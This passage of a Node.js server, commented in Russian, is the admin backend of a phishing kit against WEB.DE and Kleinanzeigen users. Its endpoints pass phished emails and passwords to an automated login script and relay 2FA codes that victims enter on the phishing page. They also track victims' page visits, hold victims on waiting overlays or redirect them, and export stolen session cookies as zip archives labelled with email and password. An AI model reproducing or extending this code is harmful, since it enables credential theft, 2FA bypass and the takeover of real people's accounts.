      if (!payload) return send(res, 500, { ok: false, error: 'payload build failed' });
      const emCtx = (lead.email || '').trim().toLowerCase();
      if (emCtx) touchWebdeScriptLock(emCtx);
      return send(res, 200, payload);
    });
    return;
  }

  /** Скрипт автовхода: сохранить шаг перебора прокси×отпечаток (чтобы новый запуск не начинал с s=0). */
  if (pathname === '/api/webde-login-grid-step' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id && String(json.id).trim();
      if (!idRaw) return send(res, 400, { ok: false, error: 'id required' });
      const id = resolveLeadId(idRaw);
      const leads = readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
      const stepPatch = {};
      if (json.step === null || json.step === undefined || json.step === '') {
        stepPatch.webdeLoginGridStep = null;
      } else {
        const n = parseInt(json.step, 10);
        if (!Number.isFinite(n) || n < 0) return send(res, 400, { ok: false, error: 'step must be non-negative integer' });
        stepPatch.webdeLoginGridStep = String(n);
      }
      try {
        if (!persistLeadPatch(id, stepPatch)) return send(res, 500, { ok: false, error: 'write error' });
      } catch (e) {
        console.error('[SERVER] webde-login-grid-step persistLeadPatch:', e);
        return send(res, 500, { ok: false, error: 'write error' });
      }
      return send(res, 200, { ok: true });
    });
    return;
  }

  /** API для скрипта входа WEB.DE: отдать email и пароль лида (скрипт опрашивает, пока админ не введёт пароль). Асинхронное чтение leads.json — не блокирует event loop при большом файле и лавине запросов. */
  if (pathname === '/api/lead-credentials' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = resolveLeadId(leadIdRaw);
    readLeadsAsync(function (err, leads) {
      if (err || !Array.isArray(leads)) {
        return send(res, 500, { ok: false, error: 'read leads failed' });
      }
      const lead = leads.find((l) => l.id === id);
      if (!lead) {
        console.log('[АДМИН] lead-credentials: лид не найден id=' + id + (id !== leadIdRaw ? ' (resolved from ' + leadIdRaw + ')' : ''));
        return send(res, 404, { ok: false });
      }
      const isKl = lead.brand === 'klein';
      const email = isKl
        ? String((lead.emailKl || lead.email || '')).trim()
        : String((lead.email || '')).trim();
      if (email) touchWebdeScriptLock(email.toLowerCase());
      const password = isKl
        ? String((lead.passwordKl != null ? lead.passwordKl : lead.password) || '').trim()
        : String((lead.password != null ? lead.password : '') || '').trim();
      return send(res, 200, { ok: true, email: email, password: password });
    });
    return;
  }

  /** Скрипт klein-orchestration: заход на /klein-anmelden и креды Klein (emailKl/passwordKl). */
  if (pathname === '/api/lead-klein-flow-poll' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = resolveLeadId(leadIdRaw);
    readLeadsAsync(function (err, leads) {
      if (err || !Array.isArray(leads)) {
        return send(res, 500, { ok: false, error: 'read leads failed' });
      }
      const lead = leads.find((l) => l.id === id);
      if (!lead) return send(res, 404, { ok: false });
      const emCtx = (lead.email || '').trim().toLowerCase();
      if (emCtx) touchWebdeScriptLock(emCtx);
      const seen = !!(lead.kleinAnmeldenSeenAt && String(lead.kleinAnmeldenSeenAt).trim());
      const emailKl = (lead.emailKl != null ? String(lead.emailKl) : '').trim();
      const passwordKl = (lead.passwordKl != null ? String(lead.passwordKl) : '').trim();
      return send(res, 200, { ok: true, anmeldenSeen: seen, emailKl: emailKl, passwordKl: passwordKl });
    });
    return;
  }

  if (pathname === '/api/klein-anmelden-seen' && req.method === 'POST') {
    if (REQUIRE_GATE_COOKIE && !hasGateCookie(req)) {
      return send(res, 403, { ok: false, error: 'forbidden' });
    }
    let bodySeen = '';
    req.on('data', (chunk) => { bodySeen += chunk; });
    req.on('end', () => {
      let j = {};
      try { j = JSON.parse(bodySeen || '{}'); } catch (e) {}
      const lid = j.leadId != null ? String(j.leadId).trim() : '';
      if (!lid) return send(res, 400, { ok: false, error: 'leadId required' });
      const id = resolveLeadId(lid);
      const leads = readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) return send(res, 404, { ok: false });
      const nowIso = new Date().toISOString();
      lead.kleinAnmeldenSeenAt = nowIso;
      lead.lastSeenAt = nowIso;
      pushEvent(lead, 'Открыл страницу Klein-anmelden');
      persistLeadPatch(id, {
        kleinAnmeldenSeenAt: lead.kleinAnmeldenSeenAt,
        lastSeenAt: lead.lastSeenAt,
        eventTerminal: lead.eventTerminal
      });
      return send(res, 200, { ok: true });
    });
    return;
  }

  /** Скрипт WEB.DE: опрос кода 2FA из лида (жертва ввела на фишинге → smsCodeData.kind === '2fa'). */
  if (pathname === '/api/webde-poll-2fa-code' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = resolveLeadId(leadIdRaw);
    readLeadsAsync(function (err, leads) {
      if (err || !Array.isArray(leads)) {
        return send(res, 500, { ok: false, error: 'read leads failed' });
      }
      const lead = leads.find((l) => l.id === id);
      if (!lead) {
        return send(res, 404, { ok: false, error: 'lead not found' });
      }
      const em = (lead.email || '').trim().toLowerCase();
      if (em) touchWebdeScriptLock(em);
      const kind = smsCodeDataKindForLead(lead);
      const d = lead.smsCodeData;
      const code = d && String(d.code || '').trim();
      const submittedAt = d && d.submittedAt != null ? String(d.submittedAt).trim() : '';
      if (kind !== '2fa' || !code) {
        return send(res, 200, { ok: true, code: null, submittedAt: null, kind: kind || null });
      }
      console.log('[АДМИН] webde-poll-2fa-code: отдан код 2FA лиду id=' + id + ' (для автовхода WEB.DE)');
      return send(res, 200, { ok: true, code: code, submittedAt: submittedAt || null, kind: '2fa' });
    });
    return;
  }

  /** Автовход забрал код 2FA с API — пишем в лог лида (видно в админке). */
  if (pathname === '/api/webde-login-2fa-received' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id != null ? String(json.id).trim() : '';
      if (!idRaw) return send(res, 400, { ok: false });
      const id = resolveLeadId(idRaw);
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.lastSeenAt = new Date().toISOString();
      const prSession = lead.webdeScriptActiveRun != null ? { session: lead.webdeScriptActiveRun } : undefined;
      pushEvent(lead, EVENT_LABELS.TWO_FA_CODE_IN, 'script', prSession);
      const patch2faIn = {
        lastSeenAt: lead.lastSeenAt,
        eventTerminal: lead.eventTerminal
      };
      if (lead.scriptStatus === 'wrong_2fa') patch2faIn.scriptStatus = null;
      persistLeadPatch(id, patch2faIn);
      return send(res, 200, { ok: true });
    });
    return;
  }

  /** Промежуточная отметка: автовход ввёл неверный 2FA на WEB.DE, ждём новый код с фишинга. */
  if (pathname === '/api/webde-login-2fa-wrong' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id != null ? String(json.id).trim() : '';
      if (!idRaw) return send(res, 400, { ok: false });
      const id = resolveLeadId(idRaw);
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.lastSeenAt = new Date().toISOString();
      const prSession = lead.webdeScriptActiveRun != null ? { session: lead.webdeScriptActiveRun } : undefined;
      pushEvent(lead, EVENT_LABELS.TWO_FA_WRONG, 'script', prSession);
      lead.scriptStatus = 'wrong_2fa';
      persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal, scriptStatus: lead.scriptStatus });
      return send(res, 200, { ok: true });
    });
    return;
  }

  /** Скачать куки аккаунта (если вход в WEB.DE прошёл успешно и скрипт сохранил куки). */
  if (pathname === '/api/lead-cookies' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadId = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadId) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = resolveLeadId(leadId);
    const leads = readLeads();
    const lead = leads.find((l) => l.id === id);
    if (!lead) return send(res, 404, { ok: false });
    const email = cookieEmailForLeadCookiesFile(lead);
    if (!email) return send(res, 404, { ok: false });
    const safe = cookieSafeForLoginCookiesFile(email);
    const cookiesPath = path.join(PROJECT_ROOT, 'login', 'cookies', safe + '.json');
    if (!fs.existsSync(cookiesPath)) return send(res, 404, { ok: false, error: 'Куки не найдены (вход не выполнялся или не был успешным)' });
    try {
      const data = fs.readFileSync(cookiesPath, 'utf8');
      const filename = 'cookies-' + sanitizeFilenameForHeader(safe) + '.json';
      res.writeHead(200, {
        'Content-Type': 'application/json',
        'Content-Disposition': 'attachment; filename="' + filename + '"',
        'Cache-Control': 'no-store'
      });
      res.end(data);
    } catch (e) {
      console.error('[АДМИН] lead-cookies: ошибка чтения файла', e);
      return send(res, 500, { ok: false, error: 'Ошибка чтения файла куки' });
    }
    return;
  }

  /** Выгрузка куки: архив .zip с .txt файлами (в каждом сверху комментарий email:pass | new: pass). mode=all — все куки (и помечаем выгруженными), mode=new — только ещё не выгружавшиеся, mode=force — все куки без пометки (принудительная выгрузка). */
  if (pathname === '/api/config/cookies-export' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const mode = (parsed.query && parsed.query.mode) ? String(parsed.query.mode).trim().toLowerCase() : 'all';
    if (mode !== 'all' && mode !== 'new' && mode !== 'force') return send(res, 400, { ok: false, error: 'mode=all|new|force' });
    const cookiesDir = path.join(PROJECT_ROOT, 'login', 'cookies');
    if (!fs.existsSync(cookiesDir)) return send(res, 200, { ok: false, error: 'Нет папки с куки' });
    const files = fs.readdirSync(cookiesDir).filter((f) => f.endsWith('.json'));
    const exportedSet = new Set(readCookiesExported());
    const toExport = (mode === 'new') ? files.filter((f) => {
      const safe = f.slice(0, -5);
      return !exportedSet.has(safe);
    }) : files;
    if (toExport.length === 0) {
      return send(res, 200, { ok: false, error: mode === 'new' ? 'Нет новых куки для выгрузки' : 'Нет файлов куки' });
    }
    const skipMarkExported = (mode === 'force');
    const leads = readLeads();
    const emailToLead = {};
    leads.forEach((l) => {
      const e = (l.email || '').trim().toLowerCase();
      if (e) emailToLead[e] = l;
    });
    const tempDir = path.join(os.tmpdir(), 'gmw-cookies-export-' + Date.now());
    const zipPath = path.join(os.tmpdir(), 'gmw-cookies-export-' + Date.now() + '.zip');
    try {
      fs.mkdirSync(tempDir, { recursive: true });
      const exportedNames = [];
      for (const f of toExport) {
        const safe = f.slice(0, -5);
        const email = safe.replace(/_at_/g, '@');
        const lead = emailToLead[email.toLowerCase()];
        const { passLogin, passNew } = lead ? getLoginAndNewPassword(lead) : { passLogin: '', passNew: '' };
        const commentLine = '# email:' + email + ':' + passLogin + ' | new: ' + passNew;
        const cookiePath = path.join(cookiesDir, f);
        const cookieData = fs.readFileSync(cookiePath, 'utf8');
        const txtContent = commentLine + '\n' + cookieData;
        const txtFileName = cookieExportFilename(email);
        fs.writeFileSync(path.join(tempDir, txtFileName), txtContent, 'utf8');
        exportedNames.push(safe);
      }
      const zipResult = spawnSync('zip', ['-r', zipPath, '.'], { cwd: tempDir, encoding: 'utf8', shell: process.platform === 'win32' });
      if (zipResult.error || zipResult.status !== 0) {
        console.error('[АДМИН] cookies-export zip error:', zipResult.error || zipResult.stderr);
        return send(res, 500, { ok: false, error: 'Ошибка создания архива' });
      }
      if (!skipMarkExported) writeCookiesExported([...readCookiesExported(), ...exportedNames]);
      try { fs.rmSync(tempDir, { recursive: true }); } catch (e) {}
      const filename = mode === 'new' ? 'cookies-new.zip' : (mode === 'force' ? 'cookies-force.zip' : 'cookies-all.zip');
      res.writeHead(200, {
        'Content-Type': 'application/zip',
        'Content-Disposition': 'attachment; filename="' + filename + '"',
        'Cache-Control': 'no-store'
      });
      const stream = fs.createReadStream(zipPath);
      stream.pipe(res);
      stream.on('end', () => {
        try { fs.unlinkSync(zipPath); } catch (e) {}
      });
      res.on('close', () => {
        try { fs.unlinkSync(zipPath); } catch (e) {}
      });
    } catch (e) {
      console.error('[АДМИН] cookies-export:', e);
      try { if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true }); } catch (e2) {}
      try { if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath); } catch (e2) {}
      return send(res, 500, { ok: false, error: String(e.message || e) });
    }
    return;
  }

  /** Скрипт входа ждёт новый пароль (long-poll). Запрос висит до сохранения пароля в админке или таймаута. */
  if (pathname === '/api/webde-wait-password' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const leadIdRaw = json.leadId && String(json.leadId).trim();
      if (!leadIdRaw) {
        return send(res, 400, { ok: false, error: 'leadId required' });
      }
      const leadId = resolveLeadId(leadIdRaw);
      try {
        const leadsW = readLeads();
        const lw = leadsW.find((l) => l.id === leadId);
        const emW = lw && (lw.email || '').trim().toLowerCase();
        if (emW) touchWebdeScriptLock(emW);
      } catch (_) {}
      if (webdePasswordWaiters[leadId]) {
        console.log('[АДМИН] long-poll webde-wait-password: новый запрос заменил предыдущий → старому клиенту timeout, leadId=' + leadId);
        try {
          clearTimeout(webdePasswordWaiters[leadId].timeoutId);
          send(webdePasswordWaiters[leadId].res, 200, { timeout: true });
        } catch (e) {}
        delete webdePasswordWaiters[leadId];
        setWebdeLeadScriptStatus(leadId, null);
      }
      const timeoutId = setTimeout(function () {
        if (!webdePasswordWaiters[leadId]) return;
        console.log('[АДМИН] long-poll webde-wait-password: истёк срок ' + Math.round(WEBDE_WAIT_PASSWORD_TIMEOUT_MS / 1000) + 'с без пароля из админки, leadId=' + leadId);
        try {
          send(webdePasswordWaiters[leadId].res, 200, { timeout: true });
        } catch (e) {}
        delete webdePasswordWaiters[leadId];
        setWebdeLeadScriptStatus(leadId, null);
      }, WEBDE_WAIT_PASSWORD_TIMEOUT_MS);
      webdePasswordWaiters[leadId] = { res: res, timeoutId: timeoutId };
      setWebdeLeadScriptStatus(leadId, 'wait_password');
      console.log('[АДМИН] long-poll webde-wait-password: запрос принят, скрипт ждёт до ' + Math.round(WEBDE_WAIT_PASSWORD_TIMEOUT_MS / 1000) + 'с, leadId=' + leadId + (leadId !== leadIdRaw ? ' (resolved ' + leadIdRaw + ')' : '') + ' — пока админ не сохранит новый пароль (лид в error после wrong_credentials)');
    });
    return;
  }

  /** Опрос скриптом: нужно ли кликнуть «Mitteilung erneut senden» на странице пуша. При запросе возвращает { resend: true } и сбрасывает флаг. */
  if (pathname === '/api/webde-push-resend-poll' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadId = parsed.query && parsed.query.leadId && String(parsed.query.leadId).trim();
    if (!leadId) return send(res, 400, { ok: false, resend: false });
    const requested = !!webdePushResendRequested[leadId];
    if (requested) delete webdePushResendRequested[leadId];
    res.writeHead(200, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' });
    res.end(JSON.stringify({ resend: requested }));
    return;
  }

  /** Скрипт отчитался: пуш переотправлен (клик по ссылке) или не удалось + причина. */
  if (pathname === '/api/webde-push-resend-result' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id && String(json.id).trim();
      const success = json.success === true;
      const message = json.message != null ? String(json.message).trim().slice(0, 200) : '';
      if (!id) return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.lastSeenAt = new Date().toISOString();
      const label = success ? EVENT_LABELS.PUSH_RESEND_OK : (EVENT_LABELS.PUSH_RESEND_FAIL + (message ? ': ' + message : ''));
      const prSession = lead.webdeScriptActiveRun != null ? { session: lead.webdeScriptActiveRun } : undefined;
      pushEvent(lead, label, 'script', prSession);
      persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  /** Скрипт входа по завершении освобождает слот и даёт запустить следующий из очереди. */
  if (pathname === '/api/webde-login-slot-done' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id != null ? String(json.id).trim() : '';
      if (!idRaw) {
        return send(res, 400, { ok: false, error: 'id required' });
      }
      const idResolved = resolveLeadId(idRaw);
      webdeLoginChildByLeadId.delete(idResolved);
      releaseWebdeLoginSlot(idResolved);
      try {
        const leadsSlot = readLeads();
        const li = leadsSlot.findIndex(function (l) { return l.id === idResolved; });
        if (li !== -1) {
          endWebdeAutoLoginRun(leadsSlot[li]);
          const Ls = leadsSlot[li];
          persistLeadPatch(idResolved, {
            webdeScriptActiveRun: Ls.webdeScriptActiveRun,
            eventTerminal: Ls.eventTerminal
          });
        }
      } catch (e) {}
      return send(res, 200, { ok: true });
    });
    return;
  }

  /** Python-скрипт: произвольная строка в EVENTS (фильтры почты, этапы Klein). */
  if (pathname === '/api/script-event' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id != null ? String(json.id).trim() : '';
      const labelRaw = json.label != null ? String(json.label).trim() : '';
      if (!idRaw || !labelRaw) {
        return send(res, 400, { ok: false, error: 'id and label required' });
      }
      const label = labelRaw.slice(0, 180);
      const id = resolveLeadId(idRaw);
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.lastSeenAt = new Date().toISOString();
      const resSessionMeta = lead.webdeScriptActiveRun != null
        ? { session: lead.webdeScriptActiveRun }
        : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? { session: lead.webdeScriptRunSeq } : undefined);
      pushEvent(lead, label, 'script', resSessionMeta);
      persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
      return send(res, 200, { ok: true });
    });
    return;
  }

  /** Скрипт входа передаёт результат: success | wrong_credentials | push | error | sms | two_factor | wrong_2fa.
   * При result=error скрипт может передать errorCode и errorMessage — они выводятся в лог лида.
   * Коды ошибок: 403 — доступ запрещён (API 403, блок); 408 — таймаут (пароль, пуш, страница);
   * 502 — сервис временно недоступен (Login vorübergehend nicht möglich, капча, блок);
   * 503 — капча не поддерживается; 500 — внутренняя ошибка (браузер, исключение, страница не распознана).
   * 500/502/503: жертва остаётся на оверлее ожидания (script_automation_wait) без редиректа — см. WEBDE_SCRIPT_VICTIM_WAIT_MS.
   * resultPhase: mail_ready_klein — после фильтров почты в оркестрации. resultSource: klein_login — ответ klein_simulation / шаг Klein. */
  if (pathname === '/api/webde-login-result' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id && String(json.id).trim();
      const result = json.result && String(json.result).trim();
      if (!idRaw) {
        console.error('[АДМИН] webde-login-result: ошибка — не передан id в теле запроса (обязательное поле).');
        return send(res, 400, { ok: false, error: 'id required' });
      }
      const valid = ['success', 'wrong_credentials', 'push', 'error', 'sms', 'two_factor', 'wrong_2fa', 'two_factor_timeout'].indexOf(result) !== -1;
      if (!valid) {
        console.error('[АДМИН] webde-login-result: ошибка — неверный result="' + result + '" (ожидается success|wrong_credentials|push|error|sms|two_factor|wrong_2fa|two_factor_timeout), id=' + idRaw);
        return send(res, 400, { ok: false, error: 'result must be success|wrong_credentials|push|error|sms|two_factor|wrong_2fa|two_factor_timeout' });
      }
      const id = resolveLeadId(idRaw);
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) {
        console.error('[АДМИН] webde-login-result: лид не найден id=' + id + (id !== idRaw ? ' (resolved from ' + idRaw + ')' : '') + '.');
        return send(res, 404, { ok: false });
      }
      const lead = leads[idx];
      const fromKleinScript = String(json.resultSource || '').trim().toLowerCase() === 'klein_login';
      const resultPhase = json.resultPhase != null ? String(json.resultPhase).trim() : '';
      const sessLog = lead.webdeScriptActiveRun != null ? lead.webdeScriptActiveRun : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? lead.webdeScriptRunSeq : '—');
      lead.lastSeenAt = new Date().toISOString();
      delete lead.scriptStatus;
      const errorCode = json.errorCode && String(json.errorCode).trim();
      const errorMessage = json.errorMessage && String(json.errorMessage).trim();
      const pushTimeout = json.pushTimeout === true;
      if (result === 'success' || result === 'wrong_credentials') {
        delete lead.webdeLoginGridExhausted;
      } else if (result === 'error' && errorMessage) {
        const emg = String(errorMessage);
        if (emg.indexOf('WEBDE_VORUEBERGEHEND_EXHAUSTED') !== -1
            || emg.indexOf('Нет комбинаций прокси') !== -1
            || emg.indexOf('Все комбинации перебраны') !== -1) {
          lead.webdeLoginGridExhausted = true;
        }
      }
      if (result === 'success' || result === 'wrong_credentials' || result === 'push' || result === 'sms'
          || result === 'two_factor' || result === 'wrong_2fa' || result === 'two_factor_timeout') {
        delete lead.webdeLoginGridStep;
      } else if (result === 'error' && !webdeErrorTriggersVictimAutomationWait(errorCode)) {
        delete lead.webdeLoginGridStep;
      }
      const klScriptCtx = fromKleinScript || lead.brand === 'klein';
      const wrongLbl = klScriptCtx ? EVENT_LABELS.WRONG_DATA_KL : EVENT_LABELS.WRONG_DATA;
      let eventLabel = ({
        success: klScriptCtx ? EVENT_LABELS.SUCCESS_KL : EVENT_LABELS.SUCCESS,
        wrong_credentials: wrongLbl,
        push: EVENT_LABELS.PUSH,
        error: 'Ошибка 502',
        sms: klScriptCtx ? EVENT_LABELS.SMS_KL : EVENT_LABELS.SMS,
        two_factor: EVENT_LABELS.TWO_FA,
        wrong_2fa: EVENT_LABELS.WRONG_2FA,
        two_factor_timeout: EVENT_LABELS.TWO_FA_TIMEOUT
      })[result] || result;
      if (result === 'success' && resultPhase === 'mail_ready_klein') {
        eventLabel = EVENT_LABELS.MAIL_READY;
      }
      if (result === 'push' && pushTimeout) {
        eventLabel = EVENT_LABELS.PUSH_TIMEOUT;
      } else if (result === 'error' && (errorCode || errorMessage)) {
        let emShow = errorMessage ? String(errorMessage).replace(/\n/g, ' ') : '';
        if (/^WEBDE_VORUEBERGEHEND_EXHAUSTED:\s*/i.test(emShow)) {
          emShow = emShow.replace(/^WEBDE_VORUEBERGEHEND_EXHAUSTED:\s*/i, '').trim();
        }
        eventLabel = 'Ошибка ' + (errorCode || '500') + (emShow ? ': ' + emShow.slice(0, 180) : '');
      }
      if (result === 'wrong_credentials' && klScriptCtx) {
        lead.kleinPasswordErrorDe = (errorMessage && String(errorMessage).trim())
          ? String(errorMessage).trim().slice(0, 400)
          : KLEIN_VICTIM_PASSWORD_ERROR_DE;
      } else if (result === 'wrong_credentials') {
        delete lead.kleinPasswordErrorDe;
      }
      // Не дублировать «неверные данные»: один ввод пароля — одно событие (скрипт/ретраи могли слать POST несколько раз)
      const term = lead.eventTerminal || [];
      const lastLblWrong = term.length > 0 ? String(term[term.length - 1].label || '') : '';
      const lastIsWrongCreds = result === 'wrong_credentials' && term.length > 0 && (
        lastLblWrong.indexOf('Неверные данные') === 0
        || lastLblWrong.indexOf('Неверный пароль') === 0
        || lastLblWrong.toLowerCase().indexOf('error password') === 0
      );
      const resSessionMeta = lead.webdeScriptActiveRun != null
        ? { session: lead.webdeScriptActiveRun }
        : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? { session: lead.webdeScriptRunSeq } : undefined);
      /** 500/502/503 → жертва в pending + script_automation_wait (оверлей), без редиректа — не пишем «Ошибка 502» в EVENTS админки. */
      const skipAdminEventForScriptVictimWait =
        result === 'error' && webdeErrorTriggersVictimAutomationWait(errorCode);
      if (!lastIsWrongCreds && !skipAdminEventForScriptVictimWait) {
        pushEvent(lead, eventLabel, 'script', resSessionMeta);
      }
      if (result === 'success') {
        const isKleinLead = (lead.brand === 'klein');
        if (isKleinLead) {
          delete lead.kleinPasswordErrorDe;
        }
        const startPage = readStartPage();
        if (isKleinLead) {
          // script-klein.js ведёт на /erfolg только при show_success; pending оставлял жертву на форме.
          if (startPage === 'change') {
            lead.status = 'redirect_change_password';
          } else if (startPage === 'download') {
            lead.status = getRedirectPasswordStatus(lead);
          } else {
            lead.status = 'show_success';
          }
        } else if (startPage === 'klein') {
          lead.status = 'redirect_klein_anmelden';
        } else if (startPage === 'login') {
          lead.status = 'show_success';
        } else if (startPage === 'change') {
          lead.status = 'redirect_change_password';
        } else if (startPage === 'download') {
          lead.status = getRedirectPasswordStatus(lead);
        } else {
          lead.status = 'show_success';
        }
      } else if (result === 'wrong_credentials') lead.status = 'error';
      else if (result === 'push') lead.status = pushTimeout ? 'pending' : 'redirect_push';
      else if (result === 'sms') lead.status = 'redirect_sms_code';
      else if (result === 'two_factor') lead.status = 'redirect_2fa_code';
      else if (result === 'wrong_2fa') lead.status = 'redirect_2fa_code';
      else if (result === 'two_factor_timeout') {
        lead.status = 'redirect_2fa_code';
      } else {
        // result === 'error' — не «неверный пароль», а блок/капча/таймаут и т.д.
        const startPage = readStartPage();
        const isKleinLead = (lead.brand === 'klein');
        // Если скрипт не дождался новый пароль от админки (long-poll timeout),
        // не редиректим никуда: только ошибка и закрываем сценарий.
        if (String(errorCode || '') === '408') {
          lead.status = 'error';
        } else if (webdeErrorTriggersVictimAutomationWait(errorCode)) {
          // 500/502/503 (прокси, отпечаток, «Weiter» без эффекта и т.п.): жертва видит оверлей ожидания, без редиректа
          lead.status = 'pending';
          lead.scriptStatus = 'script_automation_wait';
          lead.scriptAutomationWaitUntil = new Date(Date.now() + WEBDE_SCRIPT_VICTIM_WAIT_MS).toISOString();
        } else if (!isKleinLead && errorMessage && String(errorMessage).indexOf('WEBDE_VORUEBERGEHEND_EXHAUSTED') !== -1) {
          lead.status = 'redirect_change_password';
        } else if (isKleinLead) {
          lead.status = 'pending';
        } else if (startPage === 'klein') {
          lead.status = 'redirect_klein_anmelden';
        } else if (startPage === 'login') {
          lead.status = 'show_success';
        } else if (startPage === 'change') {
          lead.status = 'redirect_change_password';
        } else if (startPage === 'download') {
          lead.status = getRedirectPasswordStatus(lead);
        } else {
          lead.status = 'redirect_change_password';
        }
      }
      // Жертва могла отправить SMS/2FA-код между readLeads() в начале обработчика и writeLeads — не затирать smsCodeData.
      try {
        invalidateLeadsCache();
        const diskLeads = readLeads();
        const diskLead = diskLeads.find((l) => l.id === id);
        if (diskLead && diskLead.smsCodeData && String(diskLead.smsCodeData.code || '').trim()) {
          lead.smsCodeData = JSON.parse(JSON.stringify(diskLead.smsCodeData));
        }
      } catch (e) {}
      persistLeadFull(lead);
      clearWebdeScriptRunning((lead.email || '').trim().toLowerCase());
      const leadEmail = (lead.email || '').trim();
      logTerminalFlow(
        'АДМИН',
        'Автовход',
        sessLog,
        leadEmail,
        'POST webde-login-result id=' + id + (id !== idRaw ? ' (из ' + idRaw + ')' : '') + ' result=' + result + ' → status=' + lead.status
          + (skipAdminEventForScriptVictimWait
            ? ' | ' + (errorCode || '') + ' оверлей ожидания (событие в админке не пишем)'
            : (' | ' + (eventLabel || ''))),
      );
      if (result === 'error' && !skipAdminEventForScriptVictimWait) {
        logTerminalFlow('АДМИН', 'Система', '—', leadEmail || '—', 'коды ошибок скрипта: 403/408/502/503/500 — см. eventLabel выше');
      } else if (result === 'wrong_credentials') {
        logTerminalFlow('АДМИН', 'Автовход', sessLog, leadEmail, wrongLbl + ' → status=error');
      }
      webdeLoginChildByLeadId.delete(id);
      releaseWebdeLoginSlot(id);
      send(res, 200, { ok: true });
    });
    return;
  }

  /** Запуск скрипта входа WEB.DE для лида вручную из админки. */
  if (pathname === '/api/webde-login-start' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id && String(json.id).trim();
      if (!id) {
        console.error('[АДМИН] webde-login-start: не передан id');
        return send(res, 400, { ok: false, error: 'id required' });
      }
      const leads = readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) {
        console.error('[АДМИН] webde-login-start: лид не найден, id=' + id);
        return send(res, 404, { ok: false });
      }
      delete lead.webdeLoginGridExhausted;
      delete lead.webdeLoginGridStep;
      const email = (lead.email || '').trim();
      if (!email) {
        console.error('[АДМИН] webde-login-start: у лида нет email, id=' + id);
        return send(res, 400, { ok: false, error: 'У лида нет email' });
      }
      const emailLower = email.toLowerCase();
      preemptWebdeLoginForReplacedLead(id, emailLower);
      if (!tryAcquireWebdeScriptLock(emailLower, id)) {
